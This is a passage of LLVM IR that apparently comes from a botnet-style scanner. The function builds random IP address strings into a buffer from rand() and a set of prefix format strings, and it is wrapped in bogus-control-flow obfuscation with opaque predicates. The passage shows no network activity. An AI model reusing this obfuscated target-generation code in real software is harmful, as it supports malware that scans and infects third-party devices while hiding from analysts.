  store i8 %11, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %12 = call i32 @rand() #5
  %13 = srem i32 %12, 255
  %14 = trunc i32 %13 to i8
  store i8 %14, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %15 = call i32 @rand() #5
  %16 = srem i32 %15, 117
  store i32 %16, i32* %1, align 4
  %17 = load i32, i32* %1, align 4
  %18 = icmp eq i32 %17, 0
  br i1 %18, label %19, label %26

; <label>:19:                                     ; preds = %0
  %20 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %21 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %22 = zext i8 %21 to i32
  %23 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %24 = zext i8 %23 to i32
  %25 = call i32 (i8*, i8*, ...) @szprintf(i8* %20, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.188, i32 0, i32 0), i32 %22, i32 %24)
  br label %26

; <label>:26:                                     ; preds = %19, %0
  %27 = load i32, i32* @x.77
  %28 = load i32, i32* @y.78
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %26
  %35 = load i32, i32* %1, align 4
  %36 = icmp eq i32 %35, 1
  %37 = load i32, i32* @x.77
  %38 = load i32, i32* @y.78
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %36, label %45, label %68

; <label>:45:                                     ; preds = %originalBBpart2
  %46 = load i32, i32* @x.77
  %47 = load i32, i32* @y.78
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %45
  %54 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %55 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %56 = zext i8 %55 to i32
  %57 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %58 = zext i8 %57 to i32
  %59 = call i32 (i8*, i8*, ...) @szprintf(i8* %54, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.189, i32 0, i32 0), i32 %56, i32 %58)
  %60 = load i32, i32* @x.77
  %61 = load i32, i32* @y.78
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %68

; <label>:68:                                     ; preds = %originalBBpart24, %originalBBpart2
  %69 = load i32, i32* %1, align 4
  %70 = icmp eq i32 %69, 2
  br i1 %70, label %71, label %78

; <label>:71:                                     ; preds = %68
  %72 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %73 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %74 = zext i8 %73 to i32
  %75 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %76 = zext i8 %75 to i32
  %77 = call i32 (i8*, i8*, ...) @szprintf(i8* %72, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.190, i32 0, i32 0), i32 %74, i32 %76)
  br label %78

; <label>:78:                                     ; preds = %71, %68
  %79 = load i32, i32* %1, align 4
  %80 = icmp eq i32 %79, 3
  br i1 %80, label %81, label %88

; <label>:81:                                     ; preds = %78
  %82 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %83 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %84 = zext i8 %83 to i32
  %85 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %86 = zext i8 %85 to i32
  %87 = call i32 (i8*, i8*, ...) @szprintf(i8* %82, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.191, i32 0, i32 0), i32 %84, i32 %86)
  br label %88

; <label>:88:                                     ; preds = %81, %78
  %89 = load i32, i32* @x.77
  %90 = load i32, i32* @y.78
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %88
  %97 = load i32, i32* %1, align 4
  %98 = icmp eq i32 %97, 4
  %99 = load i32, i32* @x.77
  %100 = load i32, i32* @y.78
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %98, label %107, label %130

; <label>:107:                                    ; preds = %originalBBpart28
  %108 = load i32, i32* @x.77
  %109 = load i32, i32* @y.78
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %107
  %116 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %117 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %118 = zext i8 %117 to i32
  %119 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %120 = zext i8 %119 to i32
  %121 = call i32 (i8*, i8*, ...) @szprintf(i8* %116, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.192, i32 0, i32 0), i32 %118, i32 %120)
  %122 = load i32, i32* @x.77
  %123 = load i32, i32* @y.78
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %130

; <label>:130:                                    ; preds = %originalBBpart212, %originalBBpart28
  %131 = load i32, i32* %1, align 4
  %132 = icmp eq i32 %131, 5
  br i1 %132, label %133, label %140

; <label>:133:                                    ; preds = %130
  %134 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %135 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %136 = zext i8 %135 to i32
  %137 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %138 = zext i8 %137 to i32
  %139 = call i32 (i8*, i8*, ...) @szprintf(i8* %134, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.193, i32 0, i32 0), i32 %136, i32 %138)
  br label %140

; <label>:140:                                    ; preds = %133, %130
  %141 = load i32, i32* %1, align 4
  %142 = icmp eq i32 %141, 6
  br i1 %142, label %143, label %150

; <label>:143:                                    ; preds = %140
  %144 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %145 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %146 = zext i8 %145 to i32
  %147 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %148 = zext i8 %147 to i32
  %149 = call i32 (i8*, i8*, ...) @szprintf(i8* %144, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.194, i32 0, i32 0), i32 %146, i32 %148)
  br label %150

; <label>:150:                                    ; preds = %143, %140
  %151 = load i32, i32* @x.77
  %152 = load i32, i32* @y.78
  %153 = sub i32 %151, 1
  %154 = mul i32 %151, %153
  %155 = urem i32 %154, 2
  %156 = icmp eq i32 %155, 0
  %157 = icmp slt i32 %152, 10
  %158 = or i1 %156, %157
  br i1 %158, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %150
  %159 = load i32, i32* %1, align 4
  %160 = icmp eq i32 %159, 7
  %161 = load i32, i32* @x.77
  %162 = load i32, i32* @y.78
  %163 = sub i32 %161, 1
  %164 = mul i32 %161, %163
  %165 = urem i32 %164, 2
  %166 = icmp eq i32 %165, 0
  %167 = icmp slt i32 %162, 10
  %168 = or i1 %166, %167
  br i1 %168, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %160, label %169, label %192

; <label>:169:                                    ; preds = %originalBBpart216
  %170 = load i32, i32* @x.77
  %171 = load i32, i32* @y.78
  %172 = sub i32 %170, 1
  %173 = mul i32 %170, %172
  %174 = urem i32 %173, 2
  %175 = icmp eq i32 %174, 0
  %176 = icmp slt i32 %171, 10
  %177 = or i1 %175, %176
  br i1 %177, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %169
  %178 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %179 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %180 = zext i8 %179 to i32
  %181 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %182 = zext i8 %181 to i32
  %183 = call i32 (i8*, i8*, ...) @szprintf(i8* %178, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.195, i32 0, i32 0), i32 %180, i32 %182)
  %184 = load i32, i32* @x.77
  %185 = load i32, i32* @y.78
  %186 = sub i32 %184, 1
  %187 = mul i32 %184, %186
  %188 = urem i32 %187, 2
  %189 = icmp eq i32 %188, 0
  %190 = icmp slt i32 %185, 10
  %191 = or i1 %189, %190
  br i1 %191, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %192

; <label>:192:                                    ; preds = %originalBBpart220, %originalBBpart216
  %193 = load i32, i32* %1, align 4
  %194 = icmp eq i32 %193, 8
  br i1 %194, label %195, label %202

; <label>:195:                                    ; preds = %192
  %196 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %197 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %198 = zext i8 %197 to i32
  %199 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %200 = zext i8 %199 to i32
  %201 = call i32 (i8*, i8*, ...) @szprintf(i8* %196, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.188, i32 0, i32 0), i32 %198, i32 %200)
  br label %202

; <label>:202:                                    ; preds = %195, %192
  %203 = load i32, i32* %1, align 4
  %204 = icmp eq i32 %203, 9
  br i1 %204, label %205, label %228

; <label>:205:                                    ; preds = %202
  %206 = load i32, i32* @x.77
  %207 = load i32, i32* @y.78
  %208 = sub i32 %206, 1
  %209 = mul i32 %206, %208
  %210 = urem i32 %209, 2
  %211 = icmp eq i32 %210, 0
  %212 = icmp slt i32 %207, 10
  %213 = or i1 %211, %212
  br i1 %213, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %205
  %214 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %215 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %216 = zext i8 %215 to i32
  %217 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %218 = zext i8 %217 to i32
  %219 = call i32 (i8*, i8*, ...) @szprintf(i8* %214, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.196, i32 0, i32 0), i32 %216, i32 %218)
  %220 = load i32, i32* @x.77
  %221 = load i32, i32* @y.78
  %222 = sub i32 %220, 1
  %223 = mul i32 %220, %222
  %224 = urem i32 %223, 2
  %225 = icmp eq i32 %224, 0
  %226 = icmp slt i32 %221, 10
  %227 = or i1 %225, %226
  br i1 %227, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %228

; <label>:228:                                    ; preds = %originalBBpart224, %202
  %229 = load i32, i32* %1, align 4
  %230 = icmp eq i32 %229, 10
  br i1 %230, label %231, label %254

; <label>:231:                                    ; preds = %228
  %232 = load i32, i32* @x.77
  %233 = load i32, i32* @y.78
  %234 = sub i32 %232, 1
  %235 = mul i32 %232, %234
  %236 = urem i32 %235, 2
  %237 = icmp eq i32 %236, 0
  %238 = icmp slt i32 %233, 10
  %239 = or i1 %237, %238
  br i1 %239, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %231
  %240 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %241 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %242 = zext i8 %241 to i32
  %243 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %244 = zext i8 %243 to i32
  %245 = call i32 (i8*, i8*, ...) @szprintf(i8* %240, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.197, i32 0, i32 0), i32 %242, i32 %244)
  %246 = load i32, i32* @x.77
  %247 = load i32, i32* @y.78
  %248 = sub i32 %246, 1
  %249 = mul i32 %246, %248
  %250 = urem i32 %249, 2
  %251 = icmp eq i32 %250, 0
  %252 = icmp slt i32 %247, 10
  %253 = or i1 %251, %252
  br i1 %253, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %254

; <label>:254:                                    ; preds = %originalBBpart228, %228
  %255 = load i32, i32* %1, align 4
  %256 = icmp eq i32 %255, 11
  br i1 %256, label %257, label %264

; <label>:257:                                    ; preds = %254
  %258 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %259 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %260 = zext i8 %259 to i32
  %261 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %262 = zext i8 %261 to i32
  %263 = call i32 (i8*, i8*, ...) @szprintf(i8* %258, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.198, i32 0, i32 0), i32 %260, i32 %262)
  br label %264

; <label>:264:                                    ; preds = %257, %254
  %265 = load i32, i32* %1, align 4
  %266 = icmp eq i32 %265, 12
  br i1 %266, label %267, label %274

; <label>:267:                                    ; preds = %264
  %268 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %269 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %270 = zext i8 %269 to i32
  %271 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %272 = zext i8 %271 to i32
  %273 = call i32 (i8*, i8*, ...) @szprintf(i8* %268, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.199, i32 0, i32 0), i32 %270, i32 %272)
  br label %274

; <label>:274:                                    ; preds = %267, %264
  %275 = load i32, i32* %1, align 4
  %276 = icmp eq i32 %275, 13
  br i1 %276, label %277, label %284

; <label>:277:                                    ; preds = %274
  %278 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %279 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %280 = zext i8 %279 to i32
  %281 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %282 = zext i8 %281 to i32
  %283 = call i32 (i8*, i8*, ...) @szprintf(i8* %278, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.200, i32 0, i32 0), i32 %280, i32 %282)
  br label %284

; <label>:284:                                    ; preds = %277, %274
  %285 = load i32, i32* %1, align 4
  %286 = icmp eq i32 %285, 14
  br i1 %286, label %287, label %294

; <label>:287:                                    ; preds = %284
  %288 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %289 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %290 = zext i8 %289 to i32
  %291 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %292 = zext i8 %291 to i32
  %293 = call i32 (i8*, i8*, ...) @szprintf(i8* %288, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.201, i32 0, i32 0), i32 %290, i32 %292)
  br label %294

; <label>:294:                                    ; preds = %287, %284
  %295 = load i32, i32* %1, align 4
  %296 = icmp eq i32 %295, 15
  br i1 %296, label %297, label %304

; <label>:297:                                    ; preds = %294
  %298 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %299 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %300 = zext i8 %299 to i32
  %301 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %302 = zext i8 %301 to i32
  %303 = call i32 (i8*, i8*, ...) @szprintf(i8* %298, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.202, i32 0, i32 0), i32 %300, i32 %302)
  br label %304

; <label>:304:                                    ; preds = %297, %294
  %305 = load i32, i32* %1, align 4
  %306 = icmp eq i32 %305, 16
  br i1 %306, label %307, label %314

; <label>:307:                                    ; preds = %304
  %308 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %309 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %310 = zext i8 %309 to i32
  %311 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %312 = zext i8 %311 to i32
  %313 = call i32 (i8*, i8*, ...) @szprintf(i8* %308, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.203, i32 0, i32 0), i32 %310, i32 %312)
  br label %314

; <label>:314:                                    ; preds = %307, %304
  %315 = load i32, i32* @x.77
  %316 = load i32, i32* @y.78
  %317 = sub i32 %315, 1
  %318 = mul i32 %315, %317
  %319 = urem i32 %318, 2
  %320 = icmp eq i32 %319, 0
  %321 = icmp slt i32 %316, 10
  %322 = or i1 %320, %321
  br i1 %322, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %314
  %323 = load i32, i32* %1, align 4
  %324 = icmp eq i32 %323, 17
  %325 = load i32, i32* @x.77
  %326 = load i32, i32* @y.78
  %327 = sub i32 %325, 1
  %328 = mul i32 %325, %327
  %329 = urem i32 %328, 2
  %330 = icmp eq i32 %329, 0
  %331 = icmp slt i32 %326, 10
  %332 = or i1 %330, %331
  br i1 %332, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %324, label %333, label %356

; <label>:333:                                    ; preds = %originalBBpart232
  %334 = load i32, i32* @x.77
  %335 = load i32, i32* @y.78
  %336 = sub i32 %334, 1
  %337 = mul i32 %334, %336
  %338 = urem i32 %337, 2
  %339 = icmp eq i32 %338, 0
  %340 = icmp slt i32 %335, 10
  %341 = or i1 %339, %340
  br i1 %341, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %333
  %342 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %343 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %344 = zext i8 %343 to i32
  %345 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %346 = zext i8 %345 to i32
  %347 = call i32 (i8*, i8*, ...) @szprintf(i8* %342, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.204, i32 0, i32 0), i32 %344, i32 %346)
  %348 = load i32, i32* @x.77
  %349 = load i32, i32* @y.78
  %350 = sub i32 %348, 1
  %351 = mul i32 %348, %350
  %352 = urem i32 %351, 2
  %353 = icmp eq i32 %352, 0
  %354 = icmp slt i32 %349, 10
  %355 = or i1 %353, %354
  br i1 %355, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br label %356

; <label>:356:                                    ; preds = %originalBBpart236, %originalBBpart232
  %357 = load i32, i32* @x.77
  %358 = load i32, i32* @y.78
  %359 = sub i32 %357, 1
  %360 = mul i32 %357, %359
  %361 = urem i32 %360, 2
  %362 = icmp eq i32 %361, 0
  %363 = icmp slt i32 %358, 10
  %364 = or i1 %362, %363
  br i1 %364, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %356
  %365 = load i32, i32* %1, align 4
  %366 = icmp eq i32 %365, 18
  %367 = load i32, i32* @x.77
  %368 = load i32, i32* @y.78
  %369 = sub i32 %367, 1
  %370 = mul i32 %367, %369
  %371 = urem i32 %370, 2
  %372 = icmp eq i32 %371, 0
  %373 = icmp slt i32 %368, 10
  %374 = or i1 %372, %373
  br i1 %374, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br i1 %366, label %375, label %398

; <label>:375:                                    ; preds = %originalBBpart240
  %376 = load i32, i32* @x.77
  %377 = load i32, i32* @y.78
  %378 = sub i32 %376, 1
  %379 = mul i32 %376, %378
  %380 = urem i32 %379, 2
  %381 = icmp eq i32 %380, 0
  %382 = icmp slt i32 %377, 10
  %383 = or i1 %381, %382
  br i1 %383, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %375
  %384 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %385 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %386 = zext i8 %385 to i32
  %387 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %388 = zext i8 %387 to i32
  %389 = call i32 (i8*, i8*, ...) @szprintf(i8* %384, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.205, i32 0, i32 0), i32 %386, i32 %388)
  %390 = load i32, i32* @x.77
  %391 = load i32, i32* @y.78
  %392 = sub i32 %390, 1
  %393 = mul i32 %390, %392
  %394 = urem i32 %393, 2
  %395 = icmp eq i32 %394, 0
  %396 = icmp slt i32 %391, 10
  %397 = or i1 %395, %396
  br i1 %397, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br label %398

; <label>:398:                                    ; preds = %originalBBpart244, %originalBBpart240
  %399 = load i32, i32* %1, align 4
  %400 = icmp eq i32 %399, 19
  br i1 %400, label %401, label %424

; <label>:401:                                    ; preds = %398
  %402 = load i32, i32* @x.77
  %403 = load i32, i32* @y.78
  %404 = sub i32 %402, 1
  %405 = mul i32 %402, %404
  %406 = urem i32 %405, 2
  %407 = icmp eq i32 %406, 0
  %408 = icmp slt i32 %403, 10
  %409 = or i1 %407, %408
  br i1 %409, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %401
  %410 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %411 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %412 = zext i8 %411 to i32
  %413 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %414 = zext i8 %413 to i32
  %415 = call i32 (i8*, i8*, ...) @szprintf(i8* %410, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.206, i32 0, i32 0), i32 %412, i32 %414)
  %416 = load i32, i32* @x.77
  %417 = load i32, i32* @y.78
  %418 = sub i32 %416, 1
  %419 = mul i32 %416, %418
  %420 = urem i32 %419, 2
  %421 = icmp eq i32 %420, 0
  %422 = icmp slt i32 %417, 10
  %423 = or i1 %421, %422
  br i1 %423, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br label %424

; <label>:424:                                    ; preds = %originalBBpart248, %398
  %425 = load i32, i32* %1, align 4
  %426 = icmp eq i32 %425, 20
  br i1 %426, label %427, label %434

; <label>:427:                                    ; preds = %424
  %428 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %429 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %430 = zext i8 %429 to i32
  %431 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %432 = zext i8 %431 to i32
  %433 = call i32 (i8*, i8*, ...) @szprintf(i8* %428, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.207, i32 0, i32 0), i32 %430, i32 %432)
  br label %434

; <label>:434:                                    ; preds = %427, %424
  %435 = load i32, i32* %1, align 4
  %436 = icmp eq i32 %435, 21
  br i1 %436, label %437, label %460

; <label>:437:                                    ; preds = %434
  %438 = load i32, i32* @x.77
  %439 = load i32, i32* @y.78
  %440 = sub i32 %438, 1
  %441 = mul i32 %438, %440
  %442 = urem i32 %441, 2
  %443 = icmp eq i32 %442, 0
  %444 = icmp slt i32 %439, 10
  %445 = or i1 %443, %444
  br i1 %445, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %437
  %446 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %447 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %448 = zext i8 %447 to i32
  %449 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %450 = zext i8 %449 to i32
  %451 = call i32 (i8*, i8*, ...) @szprintf(i8* %446, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.208, i32 0, i32 0), i32 %448, i32 %450)
  %452 = load i32, i32* @x.77
  %453 = load i32, i32* @y.78
  %454 = sub i32 %452, 1
  %455 = mul i32 %452, %454
  %456 = urem i32 %455, 2
  %457 = icmp eq i32 %456, 0
  %458 = icmp slt i32 %453, 10
  %459 = or i1 %457, %458
  br i1 %459, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br label %460

; <label>:460:                                    ; preds = %originalBBpart252, %434
  %461 = load i32, i32* %1, align 4
  %462 = icmp eq i32 %461, 22
  br i1 %462, label %463, label %470

; <label>:463:                                    ; preds = %460
  %464 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %465 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %466 = zext i8 %465 to i32
  %467 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %468 = zext i8 %467 to i32
  %469 = call i32 (i8*, i8*, ...) @szprintf(i8* %464, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.209, i32 0, i32 0), i32 %466, i32 %468)
  br label %470

; <label>:470:                                    ; preds = %463, %460
  %471 = load i32, i32* @x.77
  %472 = load i32, i32* @y.78
  %473 = sub i32 %471, 1
  %474 = mul i32 %471, %473
  %475 = urem i32 %474, 2
  %476 = icmp eq i32 %475, 0
  %477 = icmp slt i32 %472, 10
  %478 = or i1 %476, %477
  br i1 %478, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %470
  %479 = load i32, i32* %1, align 4
  %480 = icmp eq i32 %479, 23
  %481 = load i32, i32* @x.77
  %482 = load i32, i32* @y.78
  %483 = sub i32 %481, 1
  %484 = mul i32 %481, %483
  %485 = urem i32 %484, 2
  %486 = icmp eq i32 %485, 0
  %487 = icmp slt i32 %482, 10
  %488 = or i1 %486, %487
  br i1 %488, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br i1 %480, label %489, label %496

; <label>:489:                                    ; preds = %originalBBpart256
  %490 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %491 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %492 = zext i8 %491 to i32
  %493 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %494 = zext i8 %493 to i32
